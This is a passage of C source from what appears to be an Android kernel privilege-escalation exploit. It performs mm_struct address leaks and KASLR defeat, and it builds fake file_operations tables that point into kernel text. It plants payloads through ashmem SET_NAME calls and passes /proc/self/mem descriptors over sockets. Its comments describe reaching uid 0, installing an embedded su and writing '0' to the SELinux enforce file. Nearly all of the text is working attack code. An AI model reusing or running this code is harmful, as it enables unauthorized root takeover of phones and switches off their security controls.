  FILE *fp = fopen("/proc/slabinfo", "r");
  if (!fp) return 0;
  char line[512];
  size_t sz = 0;
  while (fgets(line, sizeof(line), fp)) {
    if (strncmp(line, "mm_struct ", 10) != 0) continue;
    unsigned int active = 0, total = 0, size = 0, objs = 0, pages = 0;
    if (sscanf(line, "%*s %u %u %u %u %u", &active, &total, &size, &objs,
               &pages) == 5 &&
        size >= 0x200 && size <= 0x1000) {
      sz = size;
    }
    break;
  }
  fclose(fp);
  return sz;
}

static size_t runtime_mm_struct_sz(void) {
  const char *env = getenv("KSNITCH_MM_STRUCT_SZ");
  if (!env || !env[0]) {
    size_t slab = slabinfo_mm_struct_sz();
    if (slab) return slab;
  }
  return env_size_t_default("KSNITCH_MM_STRUCT_SZ", MM_STRUCT_SZ, 0x200, 0x1000);
}

static size_t runtime_mm_order(void) {
  return env_size_t_default("KSNITCH_MM_ORDER", MM_ORDER, 0, 8);
}

static size_t runtime_ksnitch_threads(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  return env_size_t_default("KSNITCH_THREADS", (size_t)cpu_count, 1, 128);
}

static int runtime_ksnitch_verbose(void) {
  return env_flag_default("KSNITCH_VERBOSE", 0);
}

static int runtime_ksnitch_mte(void) {
  return env_flag_default("KSNITCH_MTE", 0);
}

static struct kernelsnitch_shared_state *setup_kernelsnitch_runtime(void) {
  size_t mm_sz = runtime_mm_struct_sz();
  size_t mm_order = runtime_mm_order();
  size_t threads = runtime_ksnitch_threads();
  int collisions = get_ksnitch_collisions();
  int verbose = runtime_ksnitch_verbose();
  int mte = runtime_ksnitch_mte();
  pr_info("kernelsnitch runtime mm_struct_sz=%#zx mm_order=%zu "
          "threads=%zu collisions=%d verbose=%d mte=%d\n",
          mm_sz, mm_order, threads, collisions, verbose, mte);
  return kernelsnitch_setup(mm_sz, mm_order, threads, collisions, verbose, mte);
}
static unsigned char *skb_buf;
static uintptr_t skb_payload_base;
/* per-run random marker planted at each reclaim candidate's page+0x280
 * (object0 tail, outside the fops table); a matching kprobe read after
 * the sends proves THIS run's fill landed on the leaked page instead of
 * a stale table left by an earlier attempt */
static uint64_t payload_nonce;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

uintptr_t page_base;
int pselect_payload_lock;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
size_t fops_voff;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

void setup_kernelsnitch(void) {
  ks = setup_kernelsnitch_runtime();
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

/* Safe to call while find_collisions is still running (state may be
 * INIT).  Returns 1 only once the child has finished, 0 otherwise. */
int kernelsnitch_collisions_done(void) {
  if (!ks) {
    return 0;
  }
  /* state is not volatile in the struct; read through a volatile
   * pointer so the compiler cannot cache it across the poll loop. */
  volatile enum kernelsnitch_state st =
      *(volatile enum kernelsnitch_state *)&ks->state;
  return st == KERNELSNITCH_COLLISIONS_FOUND ||
         st == KERNELSNITCH_COLLISIONS_NOT_FOUND;
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

/* Persist kaslr_base + boot_id for app-uid rounds of the SAME boot.
 * perf_event_open is denied to untrusted_app, so app rounds would fall
 * back to the slide route (whose pselect probe panics there); a shared
 * file written by this (shell/root) round lets them take the verified
 * FOPS path instead.  Best-effort, called only right after the root=1
 * contract line.  fsync before return: the tail-end panic lands within
 * milliseconds of the contract line and an unflushed page cache loses
 * the file (2026-10-15 21:13 run). */
void ks_persist_kaslr_file(void) {
  if (!kaslr_done || !kaslr_base)
    return;
  const char *path = getenv("KS_KASLR_OUT");
  if (!path || !path[0])
    path = "/data/local/tmp/ksu_kaslr";
  char boot[80];
  memset(boot, 0, sizeof(boot));
  int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
  if (bfd >= 0) {
    ssize_t bn = read(bfd, boot, sizeof(boot) - 1);
    close(bfd);
    while (bn > 0 && (boot[bn - 1] == '\n' || boot[bn - 1] == '\r'))
      boot[--bn] = 0;
  }
  if (!boot[0]) {
    pr_warning("kaslr file: boot_id unavailable; not persisting\n");
    return;
  }
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (fd < 0) {
    pr_warning("kaslr file: open %s errno=%d\n", path, errno);
    return;
  }
  char line[224];
  int len = snprintf(line, sizeof(line),
                     "kaslr boot=%s text=%016llx slide=%016llx\n", boot,
                     (unsigned long long)kaslr_base,
                     (unsigned long long)kaslr_slide);
  ssize_t w = write(fd, line, (size_t)len);
  if (w == len)
    fsync(fd);
  close(fd);
  if (w != len) {
    pr_warning("kaslr file: write %zd/%d errno=%d\n", w, len, errno);
    return;
  }
  pr_info("kaslr file persisted path=%s text=%016llx\n", path,
          (unsigned long long)kaslr_base);
}

/* Capture historical panic oopses (/sys/fs/pstore retains them across
 * boots: the win-enter panic and the ENOTTY page-death panic) inside the
 * proven uid0 contract window, before the tail panic lands.  The external
 * sh uid0 window is too short (ms-scale tail panic beat setprop in the
 * 2026-10-03 run), so dump it here next to DONE.  Best-effort: every
 * failure path is pr_warning only -- pr_error would exit(-1) the success
 * path.  Harmless to call repeatedly (overwrite). */
void ks_dump_pstore_best_effort(void) {
  /* shell-domain root may be SELinux-denied on pstore/debugfs; try to go
   * permissive first (exploit chain does this anyway).  Ignore failure. */
  int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
  if (efd >= 0) {
    if (write(efd, "0", 1) != 1)
      pr_warning("pstore dump: setenforce0 errno=%d\n", errno);
    close(efd);
  }
  DIR *d = opendir("/sys/fs/pstore");
  if (!d) {
    pr_warning("pstore dump: opendir /sys/fs/pstore errno=%d\n", errno);
    return;
  }
  int out = open("/data/local/tmp/pstore_dump", O_WRONLY | O_CREAT | O_TRUNC, 0666);
  if (out < 0) {
    pr_warning("pstore dump: open dst errno=%d\n", errno);
    closedir(d);
    return;
  }
  char buf[4096];
  struct dirent *e;
  int nfiles = 0;
  while ((e = readdir(d)) != NULL) {
    if (e->d_name[0] == '.') continue;
    char p[512];
    snprintf(p, sizeof(p), "/sys/fs/pstore/%s", e->d_name);
    int in = open(p, O_RDONLY);
    if (in < 0) {
      dprintf(out, "### %s OPEN errno=%d\n", e->d_name, errno);
      continue;
    }
    dprintf(out, "### %s\n", e->d_name);
    ssize_t r;
    while ((r = read(in, buf, sizeof(buf))) > 0) {
      if (write(out, buf, (size_t)r) < 0) break;
    }
    close(in);
    nfiles++;
  }
  fsync(out); /* force the capture to disk before the ms-scale tail panic */
  close(out);
  closedir(d);
  chmod("/data/local/tmp/pstore_dump", 0666);
  pr_warning("pstore dump: %d files -> /data/local/tmp/pstore_dump\n", nfiles);
}

/* Lock DONE rc=0 into $KS_STATE_FILE from inside the process that just
 * printed the root=1 contract line.  A background watcher cannot win this
 * race: contract-line -> tail panic is milliseconds (2026-10-15 21:13 run:
 * watcher never ticked).  write+fsync here lands inside that window.
 * Best-effort; a second DONE appended by run_fops is harmless. */
void ks_lock_contract_state(void) {
  const char *path = getenv("KS_STATE_FILE");
  if (!path || !path[0])
    path = "/data/local/tmp/chain_run.state";
  int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0666);
  if (fd < 0) {
    pr_warning("contract state: open %s errno=%d\n", path, errno);
    return;
  }
  char line[96];
  int len = snprintf(line, sizeof(line),
                     "DONE %ld rc=0 (contract line seen)\n", (long)time(NULL));
  ssize_t w = write(fd, line, (size_t)len);
  if (w == len)
    fsync(fd);
  close(fd);
  if (w != len)
    pr_warning("contract state: write %zd/%d errno=%d\n", w, len, errno);
  ks_dump_pstore_best_effort();
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
  put64(p, off + FOPS_CONFIGFS_READ_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_CONFIGFS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  {
    /* KS_FOPS_OPEN_ZERO=1: probe experiment -- leave ->open NULL so
     * misc_open skips the indirect call entirely and returns -ENODEV.
     * -ENODEV => fops_get survivable + store landed + open slot read 0
     * (page content == our buf, lattice-filled); a panic instead pins the
     * root cause on [page+0x70] != 0 => the captured page is NOT our
     * payload copy. */
    const char *oz = getenv("KS_FOPS_OPEN_ZERO");
    int open_zero = oz && *oz && strcmp(oz, "0") != 0;
    put64(p, off + FOPS_OPEN_OFF,
          open_zero ? 0 : (uint64_t)text_addr(ASHMEM_OPEN));
  }
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

/*
 * v4: defuse every fake-fops landmine the close path can hit.
 *
 * KS_PSELECT_FOPS_VOFF=1 stores the fd's f_op as table+1 (historical guard
 * line: "expect ... -> ffffff91397d1001"), so filp_close / __fput / fops_put
 * read their slots through that +1 anchor:
 *   filp_close flush   -> f_op+0x78 = table[0x79..0x80]
 *   __fput     release -> f_op+0x80 = table[0x81..0x88]
 *   __fput     fasync  -> f_op+0x88 = table[0x89..0x90] (FMODE FASYNC gated)
 *   fops_put   owner   -> f_op+0x00 = table[0x01..0x08]
 * The builder writes owner=0 at table[0x00..0x08), but the +1 read picks up
 * table[0x08] = llseek's first byte (fake_w0 + PI-tree, non-zero) into the
 * top byte -> module_put(garbage) -> pstore "module_put+0x38
 * lr=__fput+0x108" (that is exactly the v2 round's tail panic).  The flush * residue at table[0x78] is the older "pc=0x10 lr=filp_close+0x54".  Zero
 * owner + flush/release/fasync THROUGH the same +1 anchor the fd uses; io
 * slots stay intact for any third-party fd still open.  After this, a close
 * from any context -- normal exit tail, the uid0 monitor SIGKILL's
 * do_exit, or a third-party process -- skips flush/release/fasync and
 * fops_put passes NULL to module_put.  Safe to call repeatedly.
 */
void ks_neutralize_fake_fops_close(int fd) {
  if (fd < 0) {
    return;
  }
  uint64_t z = 0;
  uint64_t z3[3] = {0, 0, 0};
  ssize_t wo = configfs_write_once(fd, fops_table_base() + FOPS_OWNER_OFF,
                                   &z, sizeof(z));
  ssize_t wt = configfs_write_once(fd, fops_table_base() + FOPS_FLUSH_OFF,
                                   z3, sizeof(z3));
  pr_info("ks_neutralize fake fops close slots owner=%zd tail=%zd table=%016zx\n",
          wo, wt, fops_table_base());
}

/*
 * ashmem_area layout, measured from the pfum10 Image:
 *
 *   ashmem_open()  memcpy(area, "dev/ashmem/", 11)   -> name[0..11)
 *   ashmem_set_name strcpy(area + 11, userbuf)       -> name[11..]
 *
 * so name[0..8) is the little-endian constant ASHMEM_PREFIX_COUNT and acts as
 * configfs_buffer.count for free, while our SET_NAME string starts at
 * name[ASHMEM_NAME_PREFIX_LEN].  Every CFG_*_OFF constant is measured from
 * name[0], hence the callers build their blob at (CFG_*_OFF - 11).
 *
 * The kernel side is a plain strcpy(), so the copy ends at the first NUL in
 * our string and everything past it keeps whatever ashmem_open() left there.
 * build_ashmem_name() therefore does NOT prepend "/dev/ashmem" -- the kernel
 * already supplies those 11 bytes, and prepending them here would shift the
 * whole blob 11 bytes to the right.  Instead it normalises embedded NULs to
 * 0x01 for the initial pass; try_set_ashmem_name_blob() then replants each
 * real NUL with a descending series of shorter SET_NAME calls, every one of
 * which leaves its tail untouched.  Descending order is what makes that work:
 * call N plants name[N] = 0 and keeps the correct bytes beyond it from call
 * N+1, so the final state is byte-for-byte `blob` plus one trailing NUL.
 * That is how we zero the configfs_buffer.mutex at name[0x20..0x48) and
 * needs_read_fill at name[0x48..0x4c) despite only ever writing one NUL per
 * ioctl, without depending on init_on_alloc.
 */
static void build_ashmem_name(char *name, const unsigned char *blob,
                              size_t len, size_t nul_at) {
  memset(name, 0x41, ASHMEM_NAME_LEN);
  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  if (nul_at < len) {
    name[nul_at] = 0;
  } else {
    name[len] = 0;
  }
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  build_ashmem_name(name, blob, len, len);
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  build_ashmem_name(name, blob, pos, pos);
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

/* ---- /proc/self/mem fd handoff ------------------------------------------
 * app-domain (untrusted_app, SELinux Enforcing): the parent cannot open
 * /proc/<child>/mem -- the SELinux ptrace check denies it even for a
 * same-uid same-domain child (observed 2026-10-20: SYSCHK(open(path,
 * O_RDONLY)): Permission denied right after the collision phase).  The fd,
 * however, carries no restrictions after open, and the child may always
 * open its OWN /proc/self/mem.  So the child self-opens and hands the fd
 * to the parent over a socketpair (SCM_RIGHTS); semantics are identical --
 * FMODE_UNSIGNED_OFFSET means the mm is not pinned, so the fd times preads
 * against the child's mm exactly like a parent-opened /proc/<pid>/mem.
 * Shell domain uses the same path (self-open is allowed everywhere), with
 * the direct /proc/<pid>/mem open kept as a fallback. */
struct memxfer {
  pid_t child;
  int sv;
};
static struct memxfer *memx;
static size_t memx_n, memx_cap;

static void memx_push(pid_t child, int sv) {
  if (memx_n == memx_cap) {
    memx_cap = memx_cap ? memx_cap * 2 : 64;
    memx = realloc(memx, memx_cap * sizeof(*memx));
    SYSCHK(memx);
  }
  memx[memx_n].child = child;
  memx[memx_n].sv = sv;
  memx_n++;
}

static int memx_take_sv(pid_t child) {
  for (size_t i = 0; i < memx_n; i++) {
    if (memx[i].child == child) {
      int sv = memx[i].sv;
      memx[i] = memx[--memx_n];
      return sv;
    }
  }
  return -1;
}

static int recv_memfd(int sv, int timeout_ms) {
  struct pollfd p = {.fd = sv, .events = POLLIN};
  if (poll(&p, 1, timeout_ms) <= 0) {
    return -1;
  }
  int fd = -1;
  struct msghdr msg = {0};
  struct iovec iov;
  char b;
  char cbuf[CMSG_SPACE(sizeof(int))];
  iov.iov_base = &b;
  iov.iov_len = 1;
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = cbuf;
  msg.msg_controllen = sizeof(cbuf);
  if (recvmsg(sv, &msg, 0) <= 0) {
    return -1;
  }
  struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
  if (c && c->cmsg_level == SOL_SOCKET && c->cmsg_type == SCM_RIGHTS) {
    memcpy(&fd, CMSG_DATA(c), sizeof(int));
  }
  return fd;
}

static void child_handoff_memfd(int sv[2]) {
  int fd = SYSCHK(open("/proc/self/mem", O_RDONLY));
  struct msghdr msg = {0};
  struct iovec iov;
  char b = 'x';
  char cbuf[CMSG_SPACE(sizeof(int))];
  iov.iov_base = &b;
  iov.iov_len = 1;
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = cbuf;
  msg.msg_controllen = sizeof(cbuf);
  struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
  c->cmsg_level = SOL_SOCKET;
  c->cmsg_type = SCM_RIGHTS;
  c->cmsg_len = CMSG_LEN(sizeof(int));
  memcpy(CMSG_DATA(c), &fd, sizeof(int));
  SYSCHK(sendmsg(sv[1], &msg, 0));
  close(fd);
  close(sv[1]);
}

pid_t clone_child(void) {
  int sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, sv));
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    ks_child_no_atexit = 1;
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    close(sv[0]);
    child_handoff_memfd(sv);
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  close(sv[1]);
  memx_push(child, sv[0]);
  return child;
}

pid_t clone_leak_child(void) {
  int sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, sv));
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    ks_child_no_atexit = 1;
    close(sv[0]);
    child_handoff_memfd(sv);
    kernelsnitch_find_collisions(ks);
    /* _exit, not exit: the child must NOT run the parent's inherited atexit
     * handlers (route_pi_release_atexit does FUTEX_UNLOCK_PI against the
     * route's PI futex, ashmem_guard_restore chmods /dev/ashmem back to 0666
     * globally).  Both fired on this child during reprepare and corrupted
     * the parent's route/guard state. */
    _exit(0);
  }
  close(sv[1]);
  memx_push(child, sv[0]);
  return child;
}

int open_memfd(pid_t child) {
  int sv = memx_take_sv(child);
  if (sv >= 0) {
    int fd = recv_memfd(sv, 2000);
    close(sv);
    if (fd >= 0) {
      return fd;
    }
    pr_warning("memfd handoff timeout pid=%d; direct open fallback\n",
               (int)child);
  }
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  /* chain16: ESRCH (already exited) is normal — the child may have hit
   * pr_error/_exit or been reaped; do not SYSCHK-kill the whole process. */
  if (kill(child, SIGKILL) != 0 && errno != ESRCH) {
    pr_warning("kill_child(%d) kill errno=%d\n", (int)child, errno);
  }
  while (waitpid(child, NULL, 0) < 0 && errno == EINTR) {
  }
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

int reclaim_recv_fd(void) { return reclaim_sv[1]; }

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  /* Kill any remaining children before closing memfds.  On this kernel
   * /proc/PID/mem does NOT pin mm_struct, so the children must be killed
   * to free their mm_structs.  kill_child handles child<=0 gracefully. */
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs ? prepare_ctx.childs[i] : -1);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs ? spray_ctx.childs[i] : -1);
  }
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs ? pre_ctx.childs[i] : -1);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs ? post_ctx.childs[i] : -1);
  }
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

/* skbdelta stores this run's payload base for reload_payload_base() at
 * route time.  Default sits in /data/local/temp, but a fresh locked
 * device has no temp dir and shell cannot create it (/data/local is
 * root-only), so postlock stages the file under /data/local/tmp via
 * KS_PAYLOAD_BASE_FILE (prepare writes it there before the route). */
static const char *pb_file_path(void) {
  const char *e = getenv("KS_PAYLOAD_BASE_FILE");
  if (e && e[0] && strcmp(e, "0") != 0)
    return e;
  return "/data/local/temp/skbdelta";
}

/* Read the payload line out of the skbdelta file into line[cap].
 * New format: line1 = /proc/sys/kernel/random/boot_id, line2 = payload;
 * a boot_id mismatch (stale file from a previous boot, root-owned so
 * shell could not overwrite) rejects the file outright -- the candidate
 * la0 weakens the old range check, this is the hard cross-boot guard.
 * Legacy single-line "0x..." files are still accepted.  Returns 1 when
 * a payload line is ready in line. */
static int skbdelta_read_line(char *line, size_t cap) {
  FILE *df = fopen(pb_file_path(), "r");
  if (!df)
    return 0;
  char first[80];
  memset(first, 0, sizeof(first));
  int ok = 0;
  if (fgets(first, sizeof(first), df)) {
    if (first[0] == '0' && (first[1] == 'x' || first[1] == 'X')) {
      snprintf(line, cap, "%s", first);
      ok = 1;
    } else {
      char cur[80];
      memset(cur, 0, sizeof(cur));
      int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
      ssize_t n = bfd >= 0 ? read(bfd, cur, sizeof(cur) - 1) : -1;
      if (bfd >= 0)
        close(bfd);
